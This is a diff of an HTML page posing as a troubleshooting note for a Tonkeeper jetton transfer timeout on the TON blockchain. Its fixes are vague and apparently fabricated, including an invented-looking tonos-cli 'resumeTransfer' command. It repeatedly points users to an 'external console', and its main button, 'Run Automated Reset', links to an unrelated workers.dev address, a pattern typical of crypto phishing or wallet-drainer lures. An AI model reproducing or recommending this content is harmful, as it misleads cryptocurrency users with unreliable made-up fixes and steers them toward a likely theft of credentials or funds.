@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #cf6679;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,34 +42,28 @@
 <h1>Tonkeeper Jetton Transfer Loop Timeout</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a timeout error when attempting to transfer Tonkeeper Jettons, resulting in failed transactions and a corresponding error message indicating a transfer loop timeout.</li>
+<li>Users experience a timeout error when attempting to transfer Tonkeeper Jettons, resulting in failed transactions and an inability to complete the transfer process.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a temporary mismatch between the expected and actual transaction processing times within the TON blockchain, causing the transfer loop to exceed its predefined timeout threshold.</li>
+<li>The error occurs due to excessive loop iterations during the transfer process, causing the system to timeout before the transaction can be confirmed on the TON blockchain.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can attempt the following manual overrides:</li>
-<li>Increase the transaction processing timeout threshold</li>
-<li>Manually retry the transfer operation</li>
-<li>Utilize an alternative transfer method, such as using a different wallet or exchange</li>
+<li>To resolve the issue, try the following manual overrides:</li>
+<li>Increase the transaction timeout threshold to accommodate longer processing times.</li>
+<li>Implement a retry mechanism to re-initiate the transfer process in case of a timeout.</li>
+<li>Adjust the gas price to prioritize the transaction and reduce processing time.</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span>&lt;wallet_address&gt;<span class="w"> </span>resumeTransfer<span class="w"> </span><span class="s2">&quot;&lt;jetton_address&gt;&quot;</span><span class="w"> </span>--abi<span class="w"> </span>JettonWallet.abi
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and configuration adjustments.</p>
-<h2>Prerequisites</h2>
-<ul>
-<li>Basic understanding of TON blockchain operations</li>
-<li>Familiarity with Tonkeeper wallet functionality</li>
-<li>Access to the TON blockchain network</li>
-</ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/go-ethereum-latest-geth-upgrade-resulted-in-a-chain-gap-i-think.html">Go Ethereum Latest Geth Upgrade Resulted In A Chain Gap I Think</a></li><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-async-storage-writ.html">Metamask Extension Using Waituntil To Ensure Async Storage Writ</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li></ul>
+<p>Prerequisites:
+* Tonos-cli installed and configured on your system
+* Jetton Wallet ABI file (JettonWallet.abi) available
+* Sufficient TON coins in your wallet for transaction fees
+Consider utilizing an external console to execute the above command for better control over the process.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/java-tron-feature-tron-post-quantum-signature-migration.html">Java Tron Feature Tron Post Quantum Signature Migration</a></li><li><a href="./archive/2026/06/java-tron-feature-tron-post-quantum-signature-migration.html">Java Tron Feature Tron Post Quantum Signature Migration</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
 </div>
